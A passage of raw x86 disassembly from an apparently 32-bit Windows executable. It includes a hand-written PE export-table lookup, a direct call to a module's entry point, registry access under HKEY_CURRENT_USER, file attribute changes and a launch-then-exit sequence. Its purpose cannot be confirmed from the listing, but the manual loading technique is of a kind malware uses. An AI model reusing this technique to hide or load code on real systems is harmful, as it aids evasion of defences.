  404085:	c3                   	ret
  404086:	55                   	push   %ebp
  404087:	8b ec                	mov    %esp,%ebp
  404089:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40408c:	8b 41 3c             	mov    0x3c(%ecx),%eax
  40408f:	03 c1                	add    %ecx,%eax
  404091:	f6 40 17 20          	testb  $0x20,0x17(%eax)
  404095:	75 05                	jne    0x40409c
  404097:	6a 01                	push   $0x1
  404099:	58                   	pop    %eax
  40409a:	5d                   	pop    %ebp
  40409b:	c3                   	ret
  40409c:	8b 40 28             	mov    0x28(%eax),%eax
  40409f:	6a 00                	push   $0x0
  4040a1:	ff 75 0c             	push   0xc(%ebp)
  4040a4:	03 c1                	add    %ecx,%eax
  4040a6:	51                   	push   %ecx
  4040a7:	ff d0                	call   *%eax
  4040a9:	5d                   	pop    %ebp
  4040aa:	c3                   	ret
  4040ab:	55                   	push   %ebp
  4040ac:	8b ec                	mov    %esp,%ebp
  4040ae:	83 ec 0c             	sub    $0xc,%esp
  4040b1:	8b 55 08             	mov    0x8(%ebp),%edx
  4040b4:	85 d2                	test   %edx,%edx
  4040b6:	0f 84 c7 00 00 00    	je     0x404183
  4040bc:	8b 42 3c             	mov    0x3c(%edx),%eax
  4040bf:	83 7c 10 74 10       	cmpl   $0x10,0x74(%eax,%edx,1)
  4040c4:	8d 44 10 18          	lea    0x18(%eax,%edx,1),%eax
  4040c8:	0f 82 b5 00 00 00    	jb     0x404183
  4040ce:	83 78 64 00          	cmpl   $0x0,0x64(%eax)
  4040d2:	0f 84 ab 00 00 00    	je     0x404183
  4040d8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4040db:	8b 40 60             	mov    0x60(%eax),%eax
  4040de:	c1 e9 10             	shr    $0x10,%ecx
  4040e1:	03 c2                	add    %edx,%eax
  4040e3:	66 85 c9             	test   %cx,%cx
  4040e6:	75 14                	jne    0x4040fc
  4040e8:	0f b7 4d 0c          	movzwl 0xc(%ebp),%ecx
  4040ec:	2b 48 10             	sub    0x10(%eax),%ecx
  4040ef:	8b 40 1c             	mov    0x1c(%eax),%eax
  4040f2:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4040f5:	8b 04 10             	mov    (%eax,%edx,1),%eax
  4040f8:	03 c2                	add    %edx,%eax
  4040fa:	c9                   	leave
  4040fb:	c3                   	ret
  4040fc:	8b 48 24             	mov    0x24(%eax),%ecx
  4040ff:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  404103:	53                   	push   %ebx
  404104:	56                   	push   %esi
  404105:	57                   	push   %edi
  404106:	8b 78 20             	mov    0x20(%eax),%edi
  404109:	03 fa                	add    %edx,%edi
  40410b:	03 ca                	add    %edx,%ecx
  40410d:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  404111:	76 5e                	jbe    0x404171
  404113:	eb 03                	jmp    0x404118
  404115:	8b 55 08             	mov    0x8(%ebp),%edx
  404118:	8b 75 0c             	mov    0xc(%ebp),%esi
  40411b:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40411e:	8b 37                	mov    (%edi),%esi
  404120:	03 f2                	add    %edx,%esi
  404122:	8a 16                	mov    (%esi),%dl
  404124:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404127:	88 55 ff             	mov    %dl,-0x1(%ebp)
  40412a:	3a 13                	cmp    (%ebx),%dl
  40412c:	75 1d                	jne    0x40414b
  40412e:	84 d2                	test   %dl,%dl
  404130:	74 15                	je     0x404147
  404132:	8a 56 01             	mov    0x1(%esi),%dl
  404135:	88 55 ff             	mov    %dl,-0x1(%ebp)
  404138:	3a 53 01             	cmp    0x1(%ebx),%dl
  40413b:	75 0e                	jne    0x40414b
  40413d:	83 45 f8 02          	addl   $0x2,-0x8(%ebp)
  404141:	46                   	inc    %esi
  404142:	46                   	inc    %esi
  404143:	84 d2                	test   %dl,%dl
  404145:	75 db                	jne    0x404122
  404147:	33 d2                	xor    %edx,%edx
  404149:	eb 05                	jmp    0x404150
  40414b:	1b d2                	sbb    %edx,%edx
  40414d:	83 da ff             	sbb    $0xffffffff,%edx
  404150:	85 d2                	test   %edx,%edx
  404152:	74 15                	je     0x404169
  404154:	83 c7 04             	add    $0x4,%edi
  404157:	41                   	inc    %ecx
  404158:	41                   	inc    %ecx
  404159:	ff 45 f4             	incl   -0xc(%ebp)
  40415c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40415f:	3b 50 18             	cmp    0x18(%eax),%edx
  404162:	72 b1                	jb     0x404115
  404164:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404167:	eb 03                	jmp    0x40416c
  404169:	0f b7 09             	movzwl (%ecx),%ecx
  40416c:	8b 55 08             	mov    0x8(%ebp),%edx
  40416f:	eb 03                	jmp    0x404174
  404171:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404174:	8b 75 f4             	mov    -0xc(%ebp),%esi
  404177:	5f                   	pop    %edi
  404178:	3b 70 18             	cmp    0x18(%eax),%esi
  40417b:	5e                   	pop    %esi
  40417c:	5b                   	pop    %ebx
  40417d:	0f 85 6c ff ff ff    	jne    0x4040ef
  404183:	33 c0                	xor    %eax,%eax
  404185:	c9                   	leave
  404186:	c3                   	ret
  404187:	e8 05 00 00 00       	call   0x404191
  40418c:	e9 0d 00 00 00       	jmp    0x40419e
  404191:	6a 00                	push   $0x0
  404193:	b9 48 17 41 00       	mov    $0x411748,%ecx
  404198:	e8 db ce ff ff       	call   0x401078
  40419d:	c3                   	ret
  40419e:	68 aa 41 40 00       	push   $0x4041aa
  4041a3:	e8 10 82 00 00       	call   0x40c3b8
  4041a8:	59                   	pop    %ecx
  4041a9:	c3                   	ret
  4041aa:	b9 48 17 41 00       	mov    $0x411748,%ecx
  4041af:	e9 b7 cf ff ff       	jmp    0x40116b
  4041b4:	e8 05 00 00 00       	call   0x4041be
  4041b9:	e9 15 00 00 00       	jmp    0x4041d3
  4041be:	55                   	push   %ebp
  4041bf:	8b ec                	mov    %esp,%ebp
  4041c1:	51                   	push   %ecx
  4041c2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4041c5:	b9 90 17 41 00       	mov    $0x411790,%ecx
  4041ca:	50                   	push   %eax
  4041cb:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4041d1:	c9                   	leave
  4041d2:	c3                   	ret
  4041d3:	68 df 41 40 00       	push   $0x4041df
  4041d8:	e8 db 81 00 00       	call   0x40c3b8
  4041dd:	59                   	pop    %ecx
  4041de:	c3                   	ret
  4041df:	b9 90 17 41 00       	mov    $0x411790,%ecx
  4041e4:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  4041ea:	53                   	push   %ebx
  4041eb:	bb 48 17 41 00       	mov    $0x411748,%ebx
  4041f0:	56                   	push   %esi
  4041f1:	57                   	push   %edi
  4041f2:	8b cb                	mov    %ebx,%ecx
  4041f4:	e8 a7 ce ff ff       	call   0x4010a0
  4041f9:	83 ec 10             	sub    $0x10,%esp
  4041fc:	be 78 11 41 00       	mov    $0x411178,%esi
  404201:	8b fc                	mov    %esp,%edi
  404203:	8b cb                	mov    %ebx,%ecx
  404205:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404206:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404207:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404208:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404209:	e8 f5 ce ff ff       	call   0x401103
  40420e:	80 3d a4 17 41 00 00 	cmpb   $0x0,0x4117a4
  404215:	74 16                	je     0x40422d
  404217:	83 ec 10             	sub    $0x10,%esp
  40421a:	8b c4                	mov    %esp,%eax
  40421c:	68 68 1a 41 00       	push   $0x411a68
  404221:	50                   	push   %eax
  404222:	e8 a7 70 00 00       	call   0x40b2ce
  404227:	59                   	pop    %ecx
  404228:	59                   	pop    %ecx
  404229:	6a 6d                	push   $0x6d
  40422b:	eb 14                	jmp    0x404241
  40422d:	83 ec 10             	sub    $0x10,%esp
  404230:	8b c4                	mov    %esp,%eax
  404232:	68 68 1a 41 00       	push   $0x411a68
  404237:	50                   	push   %eax
  404238:	e8 91 70 00 00       	call   0x40b2ce
  40423d:	59                   	pop    %ecx
  40423e:	59                   	pop    %ecx
  40423f:	6a 6c                	push   $0x6c
  404241:	8b cb                	mov    %ebx,%ecx
  404243:	e8 e2 ce ff ff       	call   0x40112a
  404248:	6a 00                	push   $0x0
  40424a:	68 5a 42 40 00       	push   $0x40425a
  40424f:	8b cb                	mov    %ebx,%ecx
  404251:	e8 5b cf ff ff       	call   0x4011b1
  404256:	5f                   	pop    %edi
  404257:	5e                   	pop    %esi
  404258:	5b                   	pop    %ebx
  404259:	c3                   	ret
  40425a:	55                   	push   %ebp
  40425b:	8b ec                	mov    %esp,%ebp
  40425d:	83 ec 20             	sub    $0x20,%esp
  404260:	56                   	push   %esi
  404261:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  404264:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40426a:	8b 30                	mov    (%eax),%esi
  40426c:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  404271:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  404274:	ff 30                	push   (%eax)
  404276:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404279:	6a 04                	push   $0x4
  40427b:	50                   	push   %eax
  40427c:	ff 15 cc d2 40 00    	call   *0x40d2cc
  404282:	83 ec 10             	sub    $0x10,%esp
  404285:	8b cc                	mov    %esp,%ecx
  404287:	68 68 11 41 00       	push   $0x411168
  40428c:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  404292:	83 ec 10             	sub    $0x10,%esp
  404295:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404298:	8b cc                	mov    %esp,%ecx
  40429a:	50                   	push   %eax
  40429b:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4042a1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4042a4:	50                   	push   %eax
  4042a5:	e8 43 71 00 00       	call   0x40b3ed
  4042aa:	8b c6                	mov    %esi,%eax
  4042ac:	83 c4 24             	add    $0x24,%esp
  4042af:	83 e8 42             	sub    $0x42,%eax
  4042b2:	74 27                	je     0x4042db
  4042b4:	48                   	dec    %eax
  4042b5:	75 73                	jne    0x40432a
  4042b7:	6a 00                	push   $0x0
  4042b9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4042bc:	e8 9e d8 ff ff       	call   0x401b5f
  4042c1:	8b c8                	mov    %eax,%ecx
  4042c3:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4042c9:	50                   	push   %eax
  4042ca:	ff 15 58 d3 40 00    	call   *0x40d358
  4042d0:	50                   	push   %eax
  4042d1:	ff 15 a0 17 41 00    	call   *0x4117a0
  4042d7:	59                   	pop    %ecx
  4042d8:	59                   	pop    %ecx
  4042d9:	eb 4f                	jmp    0x40432a
  4042db:	6a 00                	push   $0x0
  4042dd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4042e0:	e8 7a d8 ff ff       	call   0x401b5f
  4042e5:	8b c8                	mov    %eax,%ecx
  4042e7:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4042ed:	50                   	push   %eax
  4042ee:	e8 5e fb ff ff       	call   0x403e51
  4042f3:	85 c0                	test   %eax,%eax
  4042f5:	59                   	pop    %ecx
  4042f6:	74 32                	je     0x40432a
  4042f8:	68 04 d7 40 00       	push   $0x40d704
  4042fd:	50                   	push   %eax
  4042fe:	e8 a8 fd ff ff       	call   0x4040ab
  404303:	51                   	push   %ecx
  404304:	51                   	push   %ecx
  404305:	a3 a0 17 41 00       	mov    %eax,0x4117a0
  40430a:	8b c4                	mov    %esp,%eax
  40430c:	68 68 1a 41 00       	push   $0x411a68
  404311:	50                   	push   %eax
  404312:	c6 05 a4 17 41 00 01 	movb   $0x1,0x4117a4
  404319:	e8 b0 6f 00 00       	call   0x40b2ce
  40431e:	59                   	pop    %ecx
  40431f:	59                   	pop    %ecx
  404320:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404323:	6a 6d                	push   $0x6d
  404325:	e8 00 ce ff ff       	call   0x40112a
  40432a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40432d:	e8 fe d7 ff ff       	call   0x401b30
  404332:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  404335:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40433b:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40433e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  404344:	33 c0                	xor    %eax,%eax
  404346:	5e                   	pop    %esi
  404347:	c9                   	leave
  404348:	c3                   	ret
  404349:	e8 05 00 00 00       	call   0x404353
  40434e:	e9 15 00 00 00       	jmp    0x404368
  404353:	55                   	push   %ebp
  404354:	8b ec                	mov    %esp,%ebp
  404356:	51                   	push   %ecx
  404357:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40435a:	b9 b0 17 41 00       	mov    $0x4117b0,%ecx
  40435f:	50                   	push   %eax
  404360:	ff 15 20 d2 40 00    	call   *0x40d220
  404366:	c9                   	leave
  404367:	c3                   	ret
  404368:	68 74 43 40 00       	push   $0x404374
  40436d:	e8 46 80 00 00       	call   0x40c3b8
  404372:	59                   	pop    %ecx
  404373:	c3                   	ret
  404374:	b9 b0 17 41 00       	mov    $0x4117b0,%ecx
  404379:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  40437f:	e8 05 00 00 00       	call   0x404389
  404384:	e9 15 00 00 00       	jmp    0x40439e
  404389:	55                   	push   %ebp
  40438a:	8b ec                	mov    %esp,%ebp
  40438c:	51                   	push   %ecx
  40438d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404390:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  404395:	50                   	push   %eax
  404396:	ff 15 dc d2 40 00    	call   *0x40d2dc
  40439c:	c9                   	leave
  40439d:	c3                   	ret
  40439e:	68 aa 43 40 00       	push   $0x4043aa
  4043a3:	e8 10 80 00 00       	call   0x40c3b8
  4043a8:	59                   	pop    %ecx
  4043a9:	c3                   	ret
  4043aa:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  4043af:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  4043b5:	e8 05 00 00 00       	call   0x4043bf
  4043ba:	e9 15 00 00 00       	jmp    0x4043d4
  4043bf:	55                   	push   %ebp
  4043c0:	8b ec                	mov    %esp,%ebp
  4043c2:	51                   	push   %ecx
  4043c3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4043c6:	b9 d8 17 41 00       	mov    $0x4117d8,%ecx
  4043cb:	50                   	push   %eax
  4043cc:	ff 15 20 d2 40 00    	call   *0x40d220
  4043d2:	c9                   	leave
  4043d3:	c3                   	ret
  4043d4:	68 e0 43 40 00       	push   $0x4043e0
  4043d9:	e8 da 7f 00 00       	call   0x40c3b8
  4043de:	59                   	pop    %ecx
  4043df:	c3                   	ret
  4043e0:	b9 d8 17 41 00       	mov    $0x4117d8,%ecx
  4043e5:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  4043eb:	e8 05 00 00 00       	call   0x4043f5
  4043f0:	e9 15 00 00 00       	jmp    0x40440a
  4043f5:	55                   	push   %ebp
  4043f6:	8b ec                	mov    %esp,%ebp
  4043f8:	51                   	push   %ecx
  4043f9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4043fc:	b9 f8 19 41 00       	mov    $0x4119f8,%ecx
  404401:	50                   	push   %eax
  404402:	ff 15 20 d2 40 00    	call   *0x40d220
  404408:	c9                   	leave
  404409:	c3                   	ret
  40440a:	68 16 44 40 00       	push   $0x404416
  40440f:	e8 a4 7f 00 00       	call   0x40c3b8
  404414:	59                   	pop    %ecx
  404415:	c3                   	ret
  404416:	b9 f8 19 41 00       	mov    $0x4119f8,%ecx
  40441b:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  404421:	55                   	push   %ebp
  404422:	8b ec                	mov    %esp,%ebp
  404424:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  40442a:	66 83 a5 a4 fd ff ff 	andw   $0x0,-0x25c(%ebp)
  404431:	00 
  404432:	53                   	push   %ebx
  404433:	56                   	push   %esi
  404434:	57                   	push   %edi
  404435:	b9 81 00 00 00       	mov    $0x81,%ecx
  40443a:	33 c0                	xor    %eax,%eax
  40443c:	8d bd a6 fd ff ff    	lea    -0x25a(%ebp),%edi
  404442:	be 30 1a 41 00       	mov    $0x411a30,%esi
  404447:	f3 ab                	rep stos %eax,%es:(%edi)
  404449:	8b ce                	mov    %esi,%ecx
  40444b:	66 ab                	stos   %ax,%es:(%edi)
  40444d:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  404453:	50                   	push   %eax
  404454:	8b ce                	mov    %esi,%ecx
  404456:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40445c:	50                   	push   %eax
  40445d:	bb 08 02 00 00       	mov    $0x208,%ebx
  404462:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  404468:	53                   	push   %ebx
  404469:	bf c8 17 41 00       	mov    $0x4117c8,%edi
  40446e:	50                   	push   %eax
  40446f:	68 bc d8 40 00       	push   $0x40d8bc
  404474:	8b cf                	mov    %edi,%ecx
  404476:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40447c:	be 01 00 00 80       	mov    $0x80000001,%esi
  404481:	50                   	push   %eax
  404482:	56                   	push   %esi
  404483:	e8 8f 1a 00 00       	call   0x405f17
  404488:	83 c4 1c             	add    $0x1c,%esp
  40448b:	84 c0                	test   %al,%al
  40448d:	75 10                	jne    0x40449f
  40448f:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  404495:	53                   	push   %ebx
  404496:	50                   	push   %eax
  404497:	6a 00                	push   $0x0
  404499:	ff 15 1c d1 40 00    	call   *0x40d11c
  40449f:	8b cf                	mov    %edi,%ecx
  4044a1:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4044a7:	50                   	push   %eax
  4044a8:	56                   	push   %esi
  4044a9:	ff 15 2c d0 40 00    	call   *0x40d02c
  4044af:	8b 1d 6c d2 40 00    	mov    0x40d26c,%ebx
  4044b5:	be b8 d8 40 00       	mov    $0x40d8b8,%esi
  4044ba:	bf f8 19 41 00       	mov    $0x4119f8,%edi
  4044bf:	56                   	push   %esi
  4044c0:	57                   	push   %edi
  4044c1:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  4044c5:	ff d3                	call   *%ebx
  4044c7:	59                   	pop    %ecx
  4044c8:	84 c0                	test   %al,%al
  4044ca:	59                   	pop    %ecx
  4044cb:	74 17                	je     0x4044e4
  4044cd:	68 80 00 00 00       	push   $0x80
  4044d2:	b9 f8 19 41 00       	mov    $0x4119f8,%ecx
  4044d7:	ff 15 98 d2 40 00    	call   *0x40d298
  4044dd:	50                   	push   %eax
  4044de:	ff 15 20 d1 40 00    	call   *0x40d120
  4044e4:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  4044ea:	68 80 00 00 00       	push   $0x80
  4044ef:	50                   	push   %eax
  4044f0:	ff 15 20 d1 40 00    	call   *0x40d120
  4044f6:	85 c0                	test   %eax,%eax
  4044f8:	75 03                	jne    0x4044fd
  4044fa:	20 45 ff             	and    %al,-0x1(%ebp)
  4044fd:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404500:	68 98 d8 40 00       	push   $0x40d898
  404505:	50                   	push   %eax
  404506:	68 8c d8 40 00       	push   $0x40d88c
  40450b:	ff 15 44 d3 40 00    	call   *0x40d344
  404511:	59                   	pop    %ecx
  404512:	50                   	push   %eax
  404513:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404516:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40451c:	50                   	push   %eax
  40451d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404520:	50                   	push   %eax
  404521:	e8 a4 81 00 00       	call   0x40c6ca
  404526:	83 c4 0c             	add    $0xc,%esp
  404529:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40452c:	ff 15 9c d2 40 00    	call   *0x40d29c
  404532:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404535:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404538:	50                   	push   %eax
  404539:	68 20 d8 40 00       	push   $0x40d820
  40453e:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404544:	50                   	push   %eax
  404545:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404548:	68 f4 d7 40 00       	push   $0x40d7f4
  40454d:	50                   	push   %eax
  40454e:	e8 89 81 00 00       	call   0x40c6dc
  404553:	83 c4 0c             	add    $0xc,%esp
  404556:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404559:	ff 15 9c d2 40 00    	call   *0x40d29c
  40455f:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  404563:	74 5d                	je     0x4045c2
  404565:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404568:	68 ec d7 40 00       	push   $0x40d7ec
  40456d:	50                   	push   %eax
  40456e:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  404574:	50                   	push   %eax
  404575:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404578:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40457e:	50                   	push   %eax
  40457f:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404582:	68 bc d7 40 00       	push   $0x40d7bc
  404587:	50                   	push   %eax
  404588:	e8 4f 81 00 00       	call   0x40c6dc
  40458d:	83 c4 0c             	add    $0xc,%esp
  404590:	50                   	push   %eax
  404591:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404594:	50                   	push   %eax
  404595:	e8 30 81 00 00       	call   0x40c6ca
  40459a:	83 c4 0c             	add    $0xc,%esp
  40459d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4045a0:	50                   	push   %eax
  4045a1:	ff 15 18 d2 40 00    	call   *0x40d218
  4045a7:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4045aa:	ff 15 9c d2 40 00    	call   *0x40d29c
  4045b0:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4045b3:	ff 15 9c d2 40 00    	call   *0x40d29c
  4045b9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4045bc:	ff 15 9c d2 40 00    	call   *0x40d29c
  4045c2:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  4045c8:	68 b4 d7 40 00       	push   $0x40d7b4
  4045cd:	50                   	push   %eax
  4045ce:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4045d1:	50                   	push   %eax
  4045d2:	68 90 d7 40 00       	push   $0x40d790
  4045d7:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4045da:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4045e0:	50                   	push   %eax
  4045e1:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4045e4:	50                   	push   %eax
  4045e5:	e8 e0 80 00 00       	call   0x40c6ca
  4045ea:	83 c4 0c             	add    $0xc,%esp
  4045ed:	50                   	push   %eax
  4045ee:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4045f1:	50                   	push   %eax
  4045f2:	e8 d3 80 00 00       	call   0x40c6ca
  4045f7:	83 c4 0c             	add    $0xc,%esp
  4045fa:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4045fd:	50                   	push   %eax
  4045fe:	ff 15 18 d2 40 00    	call   *0x40d218
  404604:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404607:	ff 15 9c d2 40 00    	call   *0x40d29c
  40460d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404610:	ff 15 9c d2 40 00    	call   *0x40d29c
  404616:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404619:	ff 15 9c d2 40 00    	call   *0x40d29c
  40461f:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  404623:	74 0e                	je     0x404633
  404625:	68 84 d7 40 00       	push   $0x40d784
  40462a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40462d:	ff 15 1c d2 40 00    	call   *0x40d21c
  404633:	56                   	push   %esi
  404634:	57                   	push   %edi
  404635:	ff d3                	call   *%ebx
  404637:	59                   	pop    %ecx
  404638:	84 c0                	test   %al,%al
  40463a:	59                   	pop    %ecx
  40463b:	74 40                	je     0x40467d
  40463d:	68 b4 d7 40 00       	push   $0x40d7b4
  404642:	57                   	push   %edi
  404643:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404646:	68 5c d7 40 00       	push   $0x40d75c
  40464b:	50                   	push   %eax
  40464c:	e8 8b 80 00 00       	call   0x40c6dc
  404651:	83 c4 0c             	add    $0xc,%esp
  404654:	50                   	push   %eax
  404655:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404658:	50                   	push   %eax
  404659:	e8 6c 80 00 00       	call   0x40c6ca
  40465e:	83 c4 0c             	add    $0xc,%esp
  404661:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404664:	50                   	push   %eax
  404665:	ff 15 18 d2 40 00    	call   *0x40d218
  40466b:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40466e:	ff 15 9c d2 40 00    	call   *0x40d29c
  404674:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404677:	ff 15 9c d2 40 00    	call   *0x40d29c
  40467d:	68 0c d7 40 00       	push   $0x40d70c
  404682:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404685:	ff 15 1c d2 40 00    	call   *0x40d21c
  40468b:	33 ff                	xor    %edi,%edi
  40468d:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404690:	57                   	push   %edi
  404691:	ff 15 98 d2 40 00    	call   *0x40d298
  404697:	50                   	push   %eax
  404698:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40469b:	ff 15 38 d2 40 00    	call   *0x40d238
  4046a1:	d1 e0                	shl    $1,%eax
  4046a3:	50                   	push   %eax
  4046a4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4046a7:	ff 15 98 d2 40 00    	call   *0x40d298
  4046ad:	50                   	push   %eax
  4046ae:	e8 8b 70 00 00       	call   0x40b73e
  4046b3:	83 c4 10             	add    $0x10,%esp
  4046b6:	84 c0                	test   %al,%al
  4046b8:	74 19                	je     0x4046d3
  4046ba:	57                   	push   %edi
  4046bb:	56                   	push   %esi
  4046bc:	56                   	push   %esi
  4046bd:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4046c0:	ff 15 98 d2 40 00    	call   *0x40d298
  4046c6:	50                   	push   %eax
  4046c7:	68 d0 d6 40 00       	push   $0x40d6d0
  4046cc:	57                   	push   %edi
  4046cd:	ff 15 9c d3 40 00    	call   *0x40d39c
  4046d3:	57                   	push   %edi
  4046d4:	ff 15 48 d3 40 00    	call   *0x40d348
  4046da:	5f                   	pop    %edi
  4046db:	5e                   	pop    %esi
  4046dc:	5b                   	pop    %ebx
  4046dd:	55                   	push   %ebp
  4046de:	8b ec                	mov    %esp,%ebp
  4046e0:	81 ec 7c 02 00 00    	sub    $0x27c,%esp
  4046e6:	53                   	push   %ebx
  4046e7:	56                   	push   %esi
  4046e8:	be 30 1a 41 00       	mov    $0x411a30,%esi
  4046ed:	57                   	push   %edi
  4046ee:	8b ce                	mov    %esi,%ecx
  4046f0:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4046f6:	50                   	push   %eax
  4046f7:	8b ce                	mov    %esi,%ecx
  4046f9:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4046ff:	50                   	push   %eax
  404700:	bb 08 02 00 00       	mov    $0x208,%ebx
  404705:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  40470b:	53                   	push   %ebx
  40470c:	bf c8 17 41 00       	mov    $0x4117c8,%edi
  404711:	50                   	push   %eax
  404712:	68 bc d8 40 00       	push   $0x40d8bc
  404717:	8b cf                	mov    %edi,%ecx
  404719:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40471f:	be 01 00 00 80       	mov    $0x80000001,%esi
  404724:	50                   	push   %eax
  404725:	56                   	push   %esi
  404726:	e8 ec 17 00 00       	call   0x405f17
  40472b:	83 c4 1c             	add    $0x1c,%esp
  40472e:	84 c0                	test   %al,%al
  404730:	75 10                	jne    0x404742
  404732:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  404738:	53                   	push   %ebx
  404739:	50                   	push   %eax
  40473a:	6a 00                	push   $0x0
  40473c:	ff 15 1c d1 40 00    	call   *0x40d11c
  404742:	8b cf                	mov    %edi,%ecx
  404744:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40474a:	50                   	push   %eax
  40474b:	56                   	push   %esi
  40474c:	ff 15 2c d0 40 00    	call   *0x40d02c
  404752:	8b 1d 20 d1 40 00    	mov    0x40d120,%ebx
  404758:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  40475e:	68 80 00 00 00       	push   $0x80
  404763:	50                   	push   %eax
  404764:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  404768:	ff d3                	call   *%ebx
  40476a:	85 c0                	test   %eax,%eax
  40476c:	75 03                	jne    0x404771
  40476e:	20 45 ff             	and    %al,-0x1(%ebp)
  404771:	be b8 d8 40 00       	mov    $0x40d8b8,%esi
  404776:	bf f8 19 41 00       	mov    $0x4119f8,%edi
  40477b:	56                   	push   %esi
  40477c:	57                   	push   %edi
  40477d:	ff 15 6c d2 40 00    	call   *0x40d26c
  404783:	59                   	pop    %ecx
  404784:	84 c0                	test   %al,%al
  404786:	59                   	pop    %ecx
  404787:	74 13                	je     0x40479c
  404789:	68 80 00 00 00       	push   $0x80
  40478e:	b9 f8 19 41 00       	mov    $0x4119f8,%ecx
  404793:	ff 15 98 d2 40 00    	call   *0x40d298
